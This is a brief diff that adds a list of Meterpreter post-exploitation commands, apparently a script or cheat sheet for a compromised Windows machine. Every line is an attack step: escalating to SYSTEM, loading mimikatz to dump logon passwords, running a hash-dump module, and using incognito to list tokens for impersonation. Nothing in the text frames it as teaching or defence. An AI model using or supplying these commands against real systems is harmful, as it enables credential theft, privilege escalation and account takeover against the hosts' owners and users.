@@ -1,0 +1,7 @@
+getsystem
+sysinfo
+load mimikatz
+mimikatz_command -f sekurlsa::logonPasswords -a "full"
+run post/windows/gather/smart_hashdump
+use incognito
+list_tokens -u 
